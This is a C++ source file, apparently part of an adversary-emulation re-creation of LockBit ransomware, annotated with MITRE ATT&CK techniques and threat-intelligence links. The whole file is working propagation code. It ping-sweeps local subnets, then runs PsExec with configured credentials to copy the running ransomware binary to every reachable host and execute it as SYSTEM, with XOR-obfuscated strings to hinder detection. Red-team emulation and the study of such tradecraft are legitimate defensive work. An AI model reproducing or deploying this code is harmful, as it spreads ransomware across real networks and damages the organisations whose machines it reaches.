#include "crypto/xor_obfuscation.hpp"
#include "execute.hpp"
#include "logger.hpp"
#include "propagate.hpp"
#include "threadpool.hpp"
#include "util/network_util.hpp"
#include "util/os_util.hpp"
#include "util/string_util.hpp"
#include <stdexcept>
#include <format>

namespace propagate {

std::vector<std::wstring> discovered_remote_hosts; 
std::mutex discovered_hosts_mutex;

void pingThreadFunc(ThreadPool<std::string>* pool, std::string& target) {
    if (PingRemoteHost(target)) {
        XorLogger::LogInfo(std::format("{} {}", XOR_LIT("Successfully pinged"), target));

        // critical section
        std::lock_guard lk(propagate::discovered_hosts_mutex);
        propagate::discovered_remote_hosts.push_back(string_util::string_to_wstring(target));
        // end critical section
    } else {
        XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Failed to ping"), target));
    }
}

// Get copy of the discovered remote hosts vector
std::vector<std::wstring> getDiscoveredRemoteHosts() { 
    // critical section
    std::lock_guard lk(propagate::discovered_hosts_mutex);
    return std::vector<std::wstring>(propagate::discovered_remote_hosts);
    // end critical section
}

// Gets the IP addresses that the configuration allows us to ping.
std::set<IPAddr> GetStrictIncludePingTargets(Config& cfg) {
    std::set<IPAddr> ret;
    for (const std::string& range_str: cfg.GetStrictIncludeRanges()) {
        std::vector<IPAddr> addresses = network_util::ConvertCidrRangeStringToIPAddrs(range_str);
        std::copy(addresses.begin(), addresses.end(), std::inserter(ret, ret.end()));
    }
    return ret;
}

// Filter out any discovered hosts that don't appear in the configuration's strict-include host set.
std::vector<std::wstring> FilterDiscoveredHosts(Config& cfg, const std::vector<std::wstring>& targets) {
    std::set<std::wstring> strict_include = cfg.GetStrictIncludeHosts();
    if (strict_include.empty()) {
        return targets;
    }
    std::vector<std::wstring> ret;
    for (const std::wstring& t: targets) {
        if (strict_include.contains(t)) {
            ret.push_back(t);
        }
    }
    return ret;
}

/*
 * PingLocalNetworks:
 *      About:
 *          Pings local IPv4 networks and returns vector of std::wstring containing IPv4 addresses of
 *          remote hosts that successfully responded.
 *          If the provided configuration provides strict-include network ranges, no IP addresses
 *          outside of those ranges will be pinged.
 *          Local IP and CIDR information is gathered using the GetAdaptersInfo API call.
 *          Pinging is performed using the IcmpCreateFile and IcmpSendEcho API calls. 
 *      Result:
 *          std::vector of std::wstring containing the IPv4 addresses for each remote host that successfully
 *          responded to the ping
 *      MITRE ATT&CK Techniques:
 *          T1018: Remote System Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/
 */
std::vector<std::wstring> PingLocalNetworks(Config& cfg) {
    std::vector<IPAddr> total_targets;
    std::set<IPAddr> strict_include_ping_targets = GetStrictIncludePingTargets(cfg);
    for (std::tuple<IPAddr, uint32_t>& t: propagate::GetLocalIpv4AndCidr()) {
        XorLogger::LogInfo(std::format(
            "{}: {}/{}", 
            XOR_LIT("Grabbing and filtering ping targets from"),
            network_util::IPAddrToString(std::get<0>(t)), std::get<1>(t)
        ));
        std::vector<IPAddr> targets = propagate::GetTargetsFromLocalCidr(std::get<0>(t), std::get<1>(t), strict_include_ping_targets);
        size_t num_targets = targets.size();
        if (num_targets == 0) {
            XorLogger::LogDebug(XOR_LIT("No ping targets found for netrange."));
        } else {
            XorLogger::LogDebug(std::format(
                "{} {} to {} ({}: {})", 
                XOR_LIT("Targeting netrange IPs"),
                network_util::IPAddrToString(targets[0]), 
                network_util::IPAddrToString(targets.back()),
                XOR_LIT("total IPs after filtering and excluding self"),
                num_targets
            ));
            total_targets.insert(total_targets.end(), targets.begin(), targets.end());
        }
    }
    size_t total_num_targets = total_targets.size();
    if (total_num_targets == 0) {
        XorLogger::LogDebug(XOR_LIT("No remote target IPs found."));
    } else {
        XorLogger::LogDebug(std::format("{} {} targets", XOR_LIT("Pinging total of"), total_num_targets));
        size_t num_threads = std::thread::hardware_concurrency();
        ThreadPool<std::string> pool(num_threads, propagate::pingThreadFunc);
        XorLogger::LogDebug(std::format("{}: {}", XOR_LIT("Created thread pool for pinging targets. Pool size"), num_threads));
        for (IPAddr t: total_targets) {
            std::string target_str = network_util::IPAddrToString(t);
            pool.QueueJob(target_str);
        }
        pool.Start();
        pool.Join();
    }
    return getDiscoveredRemoteHosts();
}

// Returns command line string to execute Lockbit via PsExec against the remote targets, using
// the credentials in the specified Config and specified command-line access token
std::wstring GetPsExecCommandLine(Config& cfg, const std::vector<std::wstring>& targets, const std::wstring& access_token) {
    std::wstring username = cfg.GetPsExecUsername();
    std::wstring password = cfg.GetPsExecPassword();
    if (username.length() == 0) {
        throw std::invalid_argument(XOR_LIT("No username provided for PsExec."));
    }
    if (password.length() == 0) {
        throw std::invalid_argument(XOR_LIT("No password provided for PsExec."));
    }
    if (targets.size() == 0) {
        throw std::invalid_argument(XOR_LIT("No remote targets provided for PsExec."));
    }
    std::wstring targets_str(L"");
    for (const std::wstring& t: targets) {
        targets_str += t + L",";
    }
    targets_str.pop_back();
    
    return std::format(
        L"{}{} {} {} {} {} {}{}{}",
        XOR_WIDE_LIT(L"PsExec64.exe -accepteula \\\\"),
        targets_str,
        XOR_WIDE_LIT(L"-u"),
        username,
        XOR_WIDE_LIT(L"-p"),
        password,
        XOR_WIDE_LIT(L"-s -e -d -f -c \""),
        os_util::GetCurrExecutablePath(),
        XOR_WIDE_LIT(L"\" -d -w")
    );
}


/*
 * PerformPsExecPropagation:
 *      About:
 *          Pings local IPv4 networks to find remote targets, and then laterally moves to them
 *          via PsExec. PsExec will run on each target using the credentials provided in the
 *          config, copy the current executable over, and execute it using the provided access token.
 *          If the provided configuration provides strict-include network ranges, no IP addresses
 *          outside of those ranges will be pinged. If the configuration contains strict-include hosts,
 *          PsExec will only run on those hosts, as long as they respond to the ping attempts.
 *          The generated PsExec process will have the following command line:
 *              PsExec64.exe -accepteula \\target1,target2,...,targetN -u <psexec_username> -p <psexec_password> 
 *                  -s -e -d -f -c "<path_to_lockbit>" -d -w -pw <lockbit_access_token>
 *          Local IP and CIDR information is gathered using the GetAdaptersInfo API call.
 *          Pinging is performed using the IcmpCreateFile and IcmpSendEcho API calls.
 *          PsExec process creation is done using the CreateProcessW API call.
 *      Result:
 *          Propagation via PsExec
 *      MITRE ATT&CK Techniques:
 *          T1021.002: Remote Services: SMB/Windows Admin Shares
 *          T1543.003: Create or Modify System Process: Windows Service
 *          T1569.002: System Services: Service Execution
 *          T1570: Lateral Tool Transfer
 *          T1018: Remote System Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://redpiranha.net/news/look-lockbit-3-ransomware
 */
void PerformPsExecPropagation(Config& cfg, const std::wstring& access_token) {
    std::vector<std::wstring> targets = propagate::PingLocalNetworks(cfg);
    if (targets.size() == 0) {
        XorLogger::LogError(XOR_LIT("No targets found for PsExec propagation."));
        return;
    }
    for (const std::wstring& t: targets) {
        XorLogger::LogInfo(std::format("{}: {}", XOR_LIT("Discovered remote host"), string_util::wstring_to_string(t)));
    }
    // Filter discovered hosts
    std::vector<std::wstring> filtered_targets = propagate::FilterDiscoveredHosts(cfg, targets);
    std::string host_list = "";
    for (const std::wstring& t: filtered_targets) {
        host_list += string_util::wstring_to_string(t) + ", ";
    }
    if (!host_list.empty()) {
        host_list = host_list.substr(0, host_list.size() - 2);
        XorLogger::LogInfo(std::format("{}: {}", XOR_LIT("Filtered remote hosts to the following for PsExec propagation"), host_list));
    } else {
        XorLogger::LogInfo(XOR_LIT("None of the discovered hosts matched the strict includes configuration setting. Skipping PsExec propagation."));
        return;
    }

    std::wstring psexec_command = GetPsExecCommandLine(cfg, filtered_targets, access_token);
    XorLogger::LogDebug(std::format("{}: {}", XOR_LIT("PsExec commandline"), string_util::wstring_to_string(psexec_command)));

    // Kick off PsExec, waiting up to 2 minutes per target
    std::vector<wchar_t> command(psexec_command.begin(), psexec_command.end());
    command.push_back(L'\0');
    DWORD error_code;
    DWORD exit_code;
    std::vector<char> output = execute::ExecuteProcess(command.data(), filtered_targets.size() * 120, &error_code, &exit_code);
    if (error_code != ERROR_SUCCESS) {
        XorLogger::LogError(XOR_LIT("Failed to execute PsExec process."));
        return;
    }
    XorLogger::LogDebug(std::format(
        "{} {} and output:\n{}",
        XOR_LIT("PsExec command gave exit code"),
        exit_code, 
        std::string(output.begin(), output.end())
    ));
}

} // namespace
